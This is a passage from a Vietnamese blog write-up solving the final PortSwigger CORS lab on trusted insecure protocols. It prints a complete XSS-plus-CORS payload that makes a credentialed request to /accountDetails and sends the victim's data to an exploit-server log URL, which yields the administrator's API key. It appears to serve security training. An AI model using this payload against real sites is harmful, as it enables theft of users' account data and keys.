<p>Tiếp đó ta để ý rằng chức năng checkstock nó load bằng HTTP URL trên subdomain đó là <code>stock.0a0d00a3044b5d6780f503660034001a.web-security-academy.net</code> bên cạnh đó giá trị của productId còn bị dính XSS.</p>
<p><img src="https://hackmd.io/_uploads/Bk3ZMfvxWg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SymXMzPxbe.png" alt="image"></p>
<p>Nó đã trả alert về nên nhờ 2 chỗ này ta hoàn toàn có thể lợi dụng để tấn công vào bây giờ ta có kịch bản cho thấy rằng server đã “allow” tất cả subdomain (cùng domain gốc), nên attacker lợi dụng một subdomain HTTP + XSS để vượt qua SOP (Same-Origin Policy) và đánh cắp dữ liệu. Bây giờ ta sẽ tạo script.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://stock.0a0d00a3044b5d6780f503660034001a.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://0a0d00a3044b5d6780f503660034001a.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://exploit-0ad0005104f65d73807a02e80194003a.exploit-server.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/SJV9VfvxZl.png" alt="image"></p>
<p>Thành công bắt được log sau khi victim click vào bây giờ decode ra thôi.</p>
<p><img src="https://hackmd.io/_uploads/B1L0EGwlbx.png" alt="image"></p>
<p>Lấy được API key của Administrator submit là solve.</p>
<p><img src="https://hackmd.io/_uploads/SJ3gSzve-l.png" alt="image"></p>
<p>Solve thành công và đây cũng là lab cuối cùng của chuỗi CORS.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/16/2025-11-16-CORS-PortSwigger/">https://pzhat.github.io/2025/11/16/2025-11-16-CORS-PortSwigger/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/PortSwigger/">PortSwigger</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/25/2025-11-25-GraphQL-API-Vulnerability/" title="GraphQL API Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">GraphQL API Vulnerability</div></div><div class="info-2"><div class="info-item-1">GraphQL API Vulnerability PortSwigger ChallengeOverview về GraphQLGraphQL là một ngôn ngữ truy vấn cho API (Query Language for APIs) và cũng là một môi trường thực thi phía máy chủ (server-side runtime) để thực hiện các truy vấn đó. Để dễ hiểu hãy hình dung như sau:   Với API truyền thống (như REST API): Bạn phải gọi nhiều &quot;endpoint&quot;(đường dẫn) khác nhau để lấy các loại dữ liệu khác nhau.  Ví dụ: để lấy thông tin người dùng và các bài viết của họ, bạn có thể phải gọi &#x2F;users&#x2...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-15-I.redteam-Kerberos-Silver-Ticket/" title="Ired.Team Kerberos Silver Ticket Execution"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Ired.Team Kerberos Silver Ticket Execution</div></div><div class="info-2"><div class="info-item-1">Ired.Team Kerberos Silver TicketTiếp tục chuỗi series AD abuse thì tiếp theo ta tiến tới Kerberos Silver Ticket có nghĩa là ta sẽ hack quyền từ Kerberos nhưng không phải tạo golden ticket để truy cập mọi tài nguyên trong DC mà ở đây ta chỉ tạo Silver Ticket có quyền truy cập một số tài nguyên nhất định vì đôi khi ta cũng không cần phải full quyền để làm gì nhiều lúc sẽ dễ bị phát hiện nên ta chỉ cần lấy một vài tài nguyên, chính điều đó thì Silver Ticket ra đời. ExecutionBước 1: Chuẩn bị môi ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/25/2025-11-25-GraphQL-API-Vulnerability/" title="GraphQL API Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-25</div><div class="info-item-2">GraphQL API Vulnerability</div></div><div class="info-2"><div class="info-item-1">GraphQL API Vulnerability PortSwigger ChallengeOverview về GraphQLGraphQL là một ngôn ngữ truy vấn cho API (Query Language for APIs) và cũng là một môi trường thực thi phía máy chủ (server-side runtime) để thực hiện các truy vấn đó. Để dễ hiểu hãy hình dung như sau:   Với API truyền thống (như REST API): Bạn phải gọi nhiều &quot;endpoint&quot;(đường dẫn) khác nhau để lấy các loại dữ liệu khác nhau.  Ví dụ: để lấy thông tin người dùng và các bài viết của họ, bạn có thể phải gọi &#x2F;users&#x2...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/" title="PortSwigger CSRF Challenge WriteUps"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">PortSwigger CSRF Challenge WriteUps</div></div><div class="info-2"><div class="info-item-1">PortSwigger CSRF Challenge WriteUpGiới thiệu về CSRF (Cross-Site Request Forgery)Lỗ hổng CSRF là gì : Cross-Site Request Forgery hay còn gọi theo tiếng việt là giả mạo yêu cầu trên nhiều trang, là một lỗ hổng bảo mật cho phép attacker lừa người dùng đã được xác thực (đã đăng nhập) thực hiện các hành động không mong muốn trên 1 ứng dụng Web. Nói đơn giản thì attacker sẽ mượn danh tính và session của một victim để gửi đi một yêu cầu giả mạo đến ứng dụng mà victim không hề hay biết. Nếu ứng dụng...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLỗ hổng File UploadBản chất của File Upload: File Upload đối với tôi nó đơn giản chỉ là lợidụng Unsafe Method để truyền một Untrusted Data vào nhằm thay đổi hànhvi của hệ thống trong trường hợp này là Web App, với FileUpload những gìUser Upload lên sẽ chính là Untrusted Data và với Feature Upload Filenhư này sẽ thế nào nếu nó không được Validate một cách cẩn thận ta sẽđến với DEMO bằng Java Servlet. Web App OverviewĐây là một Web App được dựng v...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" title="Cookie Arena Challenges WU (@Phatmh)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Cookie Arena Challenges WU (@Phatmh)</div></div><div class="info-2"><div class="info-item-1">Cookie Arena Web Challenges WriteUp by (@Phatmh)NSLookup (Level 1)Đây là một Website có chức năng là nslookup sử dụng hàm shell_exec của php để thực thi. Ta tiến hành truy cập để xem giao diện của web app.Ở đây ta thấy nó khá là basic khi chỉ có duy nhất một nơi có chức năng nslookup và bên cạnh là source code cho sẵn của chall, ta sẽ tiến hành phân tích source code được cấp sẵn. Ở ngay đầu tiên ta gặp khởi tạo và include file design và tạo object ($design) có tên là NSLookup Tool. Đến với nh...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PortSwigger-CORS-Cross-Origin-Resource-Sharing-challenge-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-ve-CORS"><span class="toc-number">1.1.</span> <span class="toc-text">Overview về CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CORS-la-gi-Vi-sao-lai-xuat-hien"><span class="toc-number">1.1.1.</span> <span class="toc-text">CORS là gì? Vì sao lại xuất hiện</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Co-che-hoat-dong-cua-CORS"><span class="toc-number">1.1.2.</span> <span class="toc-text">Cơ chế hoạt động của CORS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Co-hai-loai-yeu-cau-CORS-chinh"><span class="toc-number">1.1.3.</span> <span class="toc-text">Có hai loại yêu cầu CORS chính:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cac-lo-hong-bao-mat-CORS-pho-bien"><span class="toc-number">1.1.4.</span> <span class="toc-text">Các lỗ hổng bảo mật CORS phổ biến</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cau-hinh-Access-Control-Allow-Origin-qua-rong-rai-day-la-loi-pho-bien-va-nguy-hiem-nhat"><span class="toc-number">1.1.5.</span> <span class="toc-text">Cấu hình Access-Control-Allow-Origin quá rộng rãi đây là lỗi phổ biến và nguy hiểm nhất:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cau-hinh-sai-Whitelist"><span class="toc-number">1.1.6.</span> <span class="toc-text">Cấu hình sai Whitelist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lam-dung-Access-Control-Allow-Credentials-true"><span class="toc-number">1.1.7.</span> <span class="toc-text">Lạm dụng Access-Control-Allow-Credentials: true</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lo-hong-tu-Origin-null"><span class="toc-number">1.1.8.</span> <span class="toc-text">Lỗ hổng từ Origin: null</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Di-vao-phan-tich-va-giai-tung-lab"><span class="toc-number">1.2.</span> <span class="toc-text">Đi vào phân tích và giải từng lab</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lab-CORS-vulnerability-with-basic-origin-reflection"><span class="toc-number">1.2.1.</span> <span class="toc-text">Lab: CORS vulnerability with basic origin reflection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lab-CORS-vulnerability-with-trusted-null-origin"><span class="toc-number">1.2.2.</span> <span class="toc-text">Lab: CORS vulnerability with trusted null origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lab-CORS-vulnerability-with-trusted-insecure-protocols"><span class="toc-number">1.2.3.</span> <span class="toc-text">Lab: CORS vulnerability with trusted insecure protocols</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/21/2026-21-02-CVE-2026-1581/" title="CVE-2026-1581 WordPress wpForo Forum Plugin is vulnerable to a high priority SQL Injection">CVE-2026-1581 WordPress wpForo Forum Plugin is vulnerable to a high priority SQL Injection</a><time datetime="2026-02-21T02:58:01.386Z" title="Created 2026-02-21 09:58:01">2026-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/14/2026-14-02-CVE-2026-0702/" title="CVE-2026-0702 WordPress VidShop Plugin &lt;= 1.1.4 is vulnerable to a high priority SQL Injection">CVE-2026-0702 WordPress VidShop Plugin &lt;= 1.1.4 is vulnerable to a high priority SQL Injection</a><time datetime="2026-02-14T09:29:23.541Z" title="Created 2026-02-14 16:29:23">2026-02-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/11/2026-11-02-CVE-2026-23550/" title="CVE-2026-23550 WordPress Modular DS Plugin &lt;= 2.5.1 is vulnerable to a high priority Privilege Escalation">CVE-2026-23550 WordPress Modular DS Plugin &lt;= 2.5.1 is vulnerable to a high priority Privilege Escalation</a><time datetime="2026-02-11T02:25:47.507Z" title="Created 2026-02-11 09:25:47">2026-02-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/03/2026-02-03-CVE-2025-13329/" title="CVE-2025-13329 File Uploader for WooCommerce">CVE-2025-13329 File Uploader for WooCommerce</a><time datetime="2026-02-03T15:56:51.995Z" title="Created 2026-02-03 22:56:51">2026-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/01/2026-02-01-CVE-2025-68519/" title="CVE-2025-68519 WordPress Brands for WooCommerce Plugin">CVE-2025-68519 WordPress Brands for WooCommerce Plugin</a><time datetime="2026-01-31T17:12:36.483Z" title="Created 2026-02-01 00:12:36">2026-02-01</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>